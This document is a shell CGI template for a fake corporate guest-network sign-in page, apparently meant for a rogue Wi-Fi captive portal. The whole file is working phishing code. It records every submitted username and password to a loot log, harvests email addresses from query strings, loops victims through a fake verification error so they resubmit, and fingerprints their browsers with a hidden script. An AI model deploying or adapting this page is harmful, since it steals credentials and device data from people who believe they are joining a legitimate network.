#!/bin/sh
# corp_gate template - KB Portal v1.0
# Generic corporate guest-network sign-in. POST credentials are logged; wrong or
# any credential re-renders with a polite error (classic "session expired" loop).
# NOTE: intentionally unbranded. No vendor logos on purpose (device-verified
# design decision 2026-09-06: clones are out of scope, generic-corp in).
LOOTLOG="${LOOTLOG:-/tmp/kbportal_capture.log}"   # /tmp 666 sink: CGI uid cannot traverse /root (700) - Stop archives
U=$(echo "${HTTP_USER_AGENT:-}" | cut -c1-200)
B=""
MSG=""
NAME=""
if [ "$REQUEST_METHOD" = "POST" ]; then
  B=$(dd bs=1 count="${CONTENT_LENGTH:-0}" 2>/dev/null)
  # field split on & then = - raw values stay raw (URL-encoding preserved
  # verbatim in loot: %40 etc. decode later, never mangle the capture)
  USER_=$(echo "$B" | tr '&' '\n' | grep '^user=' | head -1 | cut -d= -f2-)
  PASS_=$(echo "$B" | tr '&' '\n' | grep '^pass=' | head -1 | cut -d= -f2-)
  TS=$(date -u +%FT%TZ)
  echo "POST |$TS|ra=$REMOTE_ADDR|ua=$U|user=$USER_|pass=$PASS_|host=$HTTP_HOST" >> "$LOOTLOG" 2>/dev/null
  NAME=$(echo "$USER_" | sed 's/%40/@/g; s/+/_/g' | cut -c1-40)
  MSG="We couldn&#39;t verify those details with the network directory. Please check your password and try again, or contact your front desk."
fi
if [ "$REQUEST_METHOD" = "GET" ]; then
  TS=$(date -u +%FT%TZ)
  # QUERY_STRING on arrival is free gold: link previews ("continue as <email>")
  # and captive redirects carry the user's address without any interaction.
  echo "GET |$TS|ra=$REMOTE_ADDR|ua=$U|host=$HTTP_HOST|ref=$HTTP_REFERER|qs=$QUERY_STRING" >> "$LOOTLOG" 2>/dev/null
fi
echo "Content-Type: text/html"
echo ""
cat <<HTML
<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Network Sign In</title>
<style>
 body{margin:0;font-family:"Segoe UI",Roboto,Arial,sans-serif;background:#f4f6f8;color:#333}
 .wrap{max-width:400px;margin:56px auto;padding:0 16px}
 .card{background:#fff;border-radius:10px;box-shadow:0 2px 10px rgba(30,50,70,.12);padding:32px 28px}
 .bar{height:6px;background:linear-gradient(90deg,#1f6fb2,#38a3d1);border-radius:10px 10px 0 0}
 .lock{width:44px;height:44px;margin:0 auto 12px;display:block}
 h1{font-size:19px;text-align:center;margin:0 0 4px;color:#22456b}
 p.sub{text-align:center;font-size:13.5px;color:#5b6b7a;margin:0 0 22px;line-height:1.45}
 label{display:block;font-size:12.5px;font-weight:600;color:#39536b;margin:14px 0 5px}
 input{width:100%;box-sizing:border-box;padding:10px 11px;border:1px solid #c4d0da;border-radius:6px;font-size:15px}
 input:focus{outline:none;border-color:#1f6fb2;box-shadow:0 0 0 2px rgba(31,111,178,.15)}
 button{width:100%;margin-top:22px;padding:11px;background:#1f6fb2;color:#fff;border:0;border-radius:6px;font-size:15.5px;font-weight:600;cursor:pointer}
 button:hover{background:#1a5e98}
 .err{background:#fdf0ef;border:1px solid #f0c4c0;color:#96322a;font-size:12.8px;padding:9px 11px;border-radius:6px;margin-bottom:4px;line-height:1.4}
 .foot{text-align:center;font-size:11px;color:#93a3b1;margin-top:18px;line-height:1.5}
 .fine{font-size:11px;color:#93a3b1;text-align:center;margin-top:10px}
</style></head><body>
<div class="wrap">
 <div class="bar"></div>
 <div class="card">
  <svg class="lock" viewBox="0 0 24 24" fill="#1f6fb2"><path d="M12 2a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7a5 5 0 0 0-5-5zm-3 8V7a3 3 0 1 1 6 0v3H9zm3 5a1.6 1.6 0 0 1 .8 3V20h-1.6v-2a1.6 1.6 0 0 1 .8-3z"/></svg>
  <h1>Guest Network Access</h1>
  <p class="sub">Welcome! This network is managed for visitor and staff devices.<br>Sign in with your directory credentials to continue.</p>
  ${MSG:+<div class="err">$MSG</div>}
  <form method="POST" action="/login.cgi">
   <label for="user">Username or e-mail</label>
   <input id="user" name="user" type="text" autocapitalize="off" autocorrect="off" spellcheck="false" placeholder="name@company.com" value="$NAME">
   <label for="pass">Password</label>
   <input id="pass" name="pass" type="password" placeholder="Your network password">
   <button type="submit">Connect to network</button>
  </form>
  <p class="fine">By connecting you agree to acceptable-use monitoring.</p>
 </div>
 <p class="foot">Secure connection &#183; Network Access Gateway<br>If you have trouble signing in, ask the front desk for a guest code.</p>
</div>
<script>
try{fetch("/fp.cgi",{method:"POST",body:JSON.stringify({p:navigator.platform||"",l:(navigator.languages||[]).join(","),tz:(Intl.DateTimeFormat().resolvedOptions().timeZone||""),sc:screen.width+"x"+screen.height+"x"+(screen.colorDepth||0),co:navigator.hardwareConcurrency||0,touch:!!(navigator.maxTouchPoints&&navigator.maxTouchPoints>0),ref:document.referrer||""})})}catch(e){}
</script>
</body></html>
HTML
